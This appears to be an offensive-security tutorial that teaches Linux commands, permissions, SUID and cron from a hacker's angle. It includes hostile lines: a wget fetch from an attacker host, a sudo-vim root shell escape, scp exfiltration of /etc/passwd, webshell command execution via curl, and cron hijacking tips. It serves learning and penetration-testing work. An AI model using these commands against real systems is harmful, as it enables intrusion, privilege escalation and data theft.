
# Linux Fundamentals for Hackers & Bug Hunters — Part 2 🐧⚔️

> Most real-world exploits don’t fail because of bad payloads  
> They fail because the attacker **doesn’t understand Linux behavior**.

This document focuses on **remote access, file creation, editors, networking tools, processes, permissions, automation, and package management** — all critical after initial access.

---

# 🔹 ESSENTIAL COMMANDS (ATTACKER DEEP DIVE)

---

## `ssh` — Remote Access & Lateral Movement

### What it is
Secure Shell — encrypted remote command execution.

### Why hackers care
- Primary way to access servers
- Used for persistence
- Used for lateral movement
- Misconfigured SSH = full takeover

### Basic usage
```bash
ssh user@target_ip
````

### With key

```bash
ssh -i id_rsa user@target
```

### Attacker use cases

* Brute-forced credentials
* Leaked private keys
* SSH agent forwarding abuse
* Pivoting to internal systems

### Dangerous configs

* `PermitRootLogin yes`
* Password authentication enabled
* Weak key permissions

---

## `touch` — Silent File Creation

### What it does

Creates empty files or updates timestamps.

```bash
touch test.txt
```

### Why hackers care

* Create files without opening editors
* Bypass logging noise
* Prepare payload locations

### Example

```bash
touch /tmp/backdoor.sh
```

---

## `nano` — Simple Text Editor

### What it is

Beginner-friendly terminal editor.

### Why hackers care

* Fast edits on compromised systems
* Edit configs, cron jobs, scripts

```bash
nano config.php
```

### Attacker usage

* Modify `.bashrc`
* Add reverse shell
* Change cron entries

⚠️ Many prod servers **only have nano installed**.

---

## `vim` — Power Editor & Privilege Escalation Vector

### What it is

Advanced modal editor.

### Why hackers care

* Installed almost everywhere
* Can execute shell commands
* Can be abused with `sudo`

```bash
vim file.txt
```

### Inside vim

```vim
:!whoami
```

### Privilege escalation

```bash
sudo vim file.txt
```

Inside vim:

```vim
:!bash
```

🔥 Root shell achieved.

---

## `wget` — Download Payloads

### What it does

Downloads files via HTTP/HTTPS/FTP.

```bash
wget http://attacker.com/shell.sh
```

### Why hackers care

* Transfer payloads
* Fetch exploits
* Pull binaries

### Silent mode

```bash
wget -q url
```

---

## `scp` — Secure File Copy

### What it does

Copies files over SSH.

```bash
scp file.txt user@target:/tmp
```

### Hacker use

* Upload tools
* Exfiltrate data
* Move loot securely

```bash
scp user@target:/etc/passwd .
```

---

## `curl` — Swiss Army Knife of HTTP

### What it does

Transfers data from URLs.

### Why hackers care

* API testing
* Exploit development
* Command injection confirmation
* Webshell interaction

```bash
curl http://target/api
curl -X POST -d "a=1" url
```

### Command execution

```bash
curl http://target/shell.php?cmd=id
```

---

## 🔹 PROCESS MANAGEMENT (VERY IMPORTANT)

---

## Process Basics

Every running program = process
Every process has:

* PID
* Owner
* Permissions

---

## Common Process Commands

### List processes

```bash
ps aux
```

### Real-time monitoring

```bash
top
```

### Find specific process

```bash
ps aux | grep apache
```

---

## `fg` — Foreground a Process

### What it does

Brings background job to foreground.

```bash
fg
```

### Why hackers care

* Resume shells
* Control reverse shells
* Manage jobs during exploitation

Background a process:

```bash
Ctrl + Z
```

---

# 🔹 FILE SYSTEM (ATTACKER VIEW)

---

## Linux Philosophy

> Everything is a file — even devices and processes.

---

## Important Paths

| Path       | Attacker Value     |
| ---------- | ------------------ |
| `/etc`     | Configs, passwords |
| `/var/www` | Web apps           |
| `/home`    | User data          |
| `/tmp`     | World writable     |
| `/proc`    | Process info       |
| `/dev`     | Devices            |

---

# 🔹 FILE PERMISSIONS (CRITICAL FOR PRIV ESC)

---

## Permission Model

```text
r = read
w = write
x = execute
```

Example:

```bash
-rwxr-xr--
```

Breakdown:

* Owner: rwx
* Group: r-x
* Others: r--

---

## Numeric Representation

| Number | Meaning |
| ------ | ------- |
| 7      | rwx     |
| 6      | rw-     |
| 5      | r-x     |
| 4      | r--     |

```bash
chmod 777 file
```

⚠️ World writable = vulnerability.

---

## Ownership

```bash
chown user:file file
```

---

## SUID Bit (🔥 VERY IMPORTANT)

```bash
-rwsr-xr-x
```

Runs as owner — often root.

Find SUID files:

```bash
find / -perm -4000 2>/dev/null
```

---

# 🔹 MAINTAINING SYSTEMS — AUTOMATION (CRON)

---

## What is `cron`

Time-based task scheduler.

### Cron jobs run:

* As root
* Automatically
* Without user interaction

---

## Cron locations

```bash
/etc/crontab
/etc/cron.d/
/var/spool/cron/
```

---

## Cron format

```text
* * * * * command
```

Example:

```bash
* * * * * root /backup.sh
```

---

## Attacker opportunities

* Writable scripts
* PATH hijacking
* Weak permissions

If you can modify a cron-executed file → **root shell**.

---

# 🔹 PACKAGE MANAGEMENT

---

## Why hackers care

* Install tools
* Identify outdated software
* Exploit known vulnerabilities

---

## Debian-based

```bash
apt update
apt install tool
```

---

## RedHat-based

```bash
yum install tool
dnf install tool
```

---

## Security issues

* Old packages
* Unsupported versions
* Custom repos

Check versions:

```bash
dpkg -l
rpm -qa
```

---

# 🧠 Attacker Mindset Summary

Linux exploitation is about:

* Understanding **who runs what**
* Understanding **what executes automatically**
* Understanding **what you can write**
* Understanding **what runs as root**

Commands don’t matter — **logic does**.


